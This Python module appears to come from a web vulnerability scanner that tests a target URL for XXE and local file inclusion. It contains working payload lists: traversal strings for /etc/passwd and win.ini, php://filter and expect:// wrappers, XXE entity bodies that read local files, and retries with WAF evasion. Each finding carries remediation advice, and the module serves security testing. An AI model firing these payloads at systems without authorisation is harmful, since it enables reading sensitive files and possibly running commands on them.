# modules/vuln/advanced/xxe_lfi.py
"""ReconX - Advanced XXE and local/remote file inclusion testing.

XXE: posts external-entity payloads (generic, SOAP, SVG) and looks for file
contents or parser errors in the response.
LFI: fuzzes file/page/include parameters with traversal, encoding-bypass,
wrapper (php://filter, expect://, data://) and Windows payloads. Payloads are
retried with WAF-evasion mutations when the plain request is blocked.

RFI cannot be confirmed without an out-of-band listener, so the module reports
wrapper acceptance and leaves RFI to a manual collaborator test.
"""

import base64
import re
import urllib.parse

from modules.utils.http_client import (
    adaptive_request, is_blocked, join_url, normalize_url, query_params,
    random_token, request, with_params,
)
from modules.vuln.advanced.base import add_finding, finalize, finding, new_result, print_report

LFI_PARAMS = [
    "file", "page", "path", "include", "template", "view", "doc", "document",
    "download", "load", "read", "src", "source", "url", "folder", "root",
    "content", "module", "lang", "locale",
]

LFI_MARKERS = ["root:x:0:0", "root:*:0:0", "daemon:x:", "bin/bash", "[fonts]",
               "for 16-bit app support", "uid=", "www-data"]

LFI_PAYLOADS = [
    ("unix_traversal", "../../../../../../etc/passwd"),
    ("unix_traversal_deep", "../../../../../../../../../../etc/passwd"),
    ("unix_absolute", "/etc/passwd"),
    ("unix_filter_bypass", "....//....//....//....//etc/passwd"),
    ("unix_url_encoded", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("unix_double_encoded", "..%252f..%252f..%252f..%252fetc%252fpasswd"),
    ("null_byte", "../../../../etc/passwd%00.png"),
    ("proc_self_environ", "../../../../../../proc/self/environ"),
    ("php_filter", "php://filter/convert.base64-encode/resource=/etc/passwd"),
    ("php_filter_index", "php://filter/convert.base64-encode/resource=index.php"),
    ("expect_wrapper", "expect://id"),
    ("data_wrapper", "data://text/plain;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA=="),
    ("windows_traversal", "..\\..\\..\\..\\..\\windows\\win.ini"),
    ("windows_absolute", "C:\\windows\\win.ini"),
    ("windows_boot_ini", "..\\..\\..\\..\\boot.ini"),
]

XXE_PAYLOADS = [
    ("generic", "application/xml", """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE reconx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reconx><name>&xxe;</name></reconx>"""),
    ("soap", "text/xml", """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE reconx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><reconx>&xxe;</reconx></soap:Body>
</soap:Envelope>"""),
    ("svg_upload", "image/svg+xml", """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""),
    ("parameter_entity", "application/xml", """<?xml version="1.0"?>
<!DOCTYPE reconx [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">%eval;]>
<reconx>test</reconx>"""),
]

XML_ERROR_MARKERS = ["failed to load external entity", "external entity",
                     "doctype is disallowed", "entity expansion", "xml parse error",
                     "xmlparser", "libxml", "simplexml", "saxparseexception"]


def _lfi_marker(body):
    low = (body or "").lower()
    for marker in LFI_MARKERS:
        if marker in low:
            return marker
    # php://filter returns base64-encoded file contents
    compact = re.sub(r"\s+", "", body or "")
    if len(compact) > 40 and re.fullmatch(r"[A-Za-z0-9+/=]+", compact):
        try:
            decoded = base64.b64decode(compact + "=" * (-len(compact) % 4)).decode(
                "utf-8", errors="ignore")
            if "root:x:0:0" in decoded or "<?php" in decoded:
                return "php_filter_base64"
        except Exception:
            pass
    return None


def test_lfi(target, timeout=10, verbose=False, result=None):
    params = query_params(target)
    if not params:
        params = LFI_PARAMS[:6]
        target = with_params(target, {params[0]: "reconx"})

    # Baseline with a benign value so we never flag content already on the page.
    baseline = request(with_params(target, {params[0]: random_token()}), timeout=timeout)
    baseline_body = baseline.body or ""

    for param in params[:10]:
        for label, payload in LFI_PAYLOADS:
            send = lambda value, p=param: request(
                with_params(target, {p: value}), timeout=timeout)
            used, resp, mutation = adaptive_request(send, payload, limit=3)
            if resp.error:
                continue
            marker = _lfi_marker(resp.body)
            if not marker:
                continue
            if marker in baseline_body.lower():
                continue

            add_finding(result, finding(
                f"lfi_{param}_{label}",
                f"Local file inclusion via '{param}' ({label})",
                "critical",
                with_params(target, {param: used}),
                f"Payload {payload[:70]!r} returned marker '{marker}'"
                + (f" after WAF evasion ({mutation})" if mutation not in ("plain", "blocked") else ""),
                description=("The application includes a file path controlled by the client. "
                             "This leaks arbitrary local files and often escalates to RCE via "
                             "log poisoning or PHP wrappers."),
                remediation=("Map user input to an allowlist of file identifiers; never pass "
                             "client paths to include/read functions."),
                confidence=0.95,
                bug_class="local_file_inclusion",
                parameter=param,
                payload=payload,
                source="xxe_lfi",
            ))
            if verbose:
                print(f"    [!] LFI via '{param}' -> {marker}")
            break  # one confirmed payload per parameter is enough


def test_xxe(target, timeout=10, verbose=False, result=None):
    endpoints = [target]
    for path in ("/api/xml", "/xmlrpc.php", "/soap", "/ws"):
        candidate = join_url(target, path)
        if candidate not in endpoints:
            endpoints.append(candidate)

    # Establish a baseline with a plain XML body on the same endpoint.
    plain = '<?xml version="1.0"?><reconx>test</reconx>'
    for endpoint in endpoints[:4]:
        baseline = request(endpoint, method="POST", data=plain, timeout=timeout,
                           headers={"Content-Type": "application/xml"})
        if baseline.error:
            continue
        for label, content_type, payload in XXE_PAYLOADS:
            resp = request(endpoint, method="POST", data=payload, timeout=timeout,
                           headers={"Content-Type": content_type})
            if resp.error:
                continue

            low = (resp.body or "").lower()
            if "root:x:0:0" in low or "[fonts]" in low:
                add_finding(result, finding(
                    f"xxe_{label}",
                    f"XML external entity injection ({label})",
                    "critical",
                    endpoint,
                    f"External entity resolved and file contents returned "
                    f"({len(resp.body)} byte response)",
                    description=("The XML parser resolves external entities, allowing file "
                                 "disclosure and SSRF. In some parsers this reaches RCE."),
                    remediation=("Disable DTDs/external entities in the parser "
                                 "(disallow-doctype-decl, external-general-entities=false)."),
                    confidence=0.98,
                    bug_class="xxe",
                    source="xxe_lfi",
                ))
                if verbose:
                    print(f"    [!] XXE confirmed on {endpoint} ({label})")
                return

            leaked = [m for m in XML_ERROR_MARKERS if m in low]
            if leaked and not is_blocked(resp):
                add_finding(result, finding(
                    f"xxe_parser_{label}",
                    "XML parser processes external entities (error-based)",
                    "medium",
                    endpoint,
                    f"Parser error mentions {', '.join(leaked[:2])}",
                    description=("The parser attempted to resolve the external entity even "
                                 "though the contents were not returned. Blind XXE is likely "
                                 "exploitable with an out-of-band listener."),
                    remediation="Disable DTD processing and external entity resolution.",
                    confidence=0.6,
                    bug_class="xxe",
                    source="xxe_lfi",
                ))
                if verbose:
                    print(f"    [?] Possible blind XXE on {endpoint} ({label})")
                break


def scan(target, timeout=10, verbose=False):
    target = normalize_url(target)
    result = new_result(target)
    result["checks_run"].extend(["xxe", "lfi"])

    try:
        test_xxe(target, timeout=timeout, verbose=verbose, result=result)
    except Exception as e:
        result["errors"].append(f"xxe: {e}")

    try:
        test_lfi(target, timeout=timeout, verbose=verbose, result=result)
    except Exception as e:
        result["errors"].append(f"lfi: {e}")

    if not result["findings"]:
        result["note"] = ("No XXE/LFI marker observed. RFI requires an out-of-band listener "
                          "and is not attempted automatically.")

    return finalize(result)


run_scanner = scan


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python -m modules.vuln.advanced.xxe_lfi <url>")
        print("   e.g. python -m modules.vuln.advanced.xxe_lfi "
              "'https://example.com/view?page=home'")
        sys.exit(1)
    print_report(scan(sys.argv[1], verbose=True), "XXE / File Inclusion")
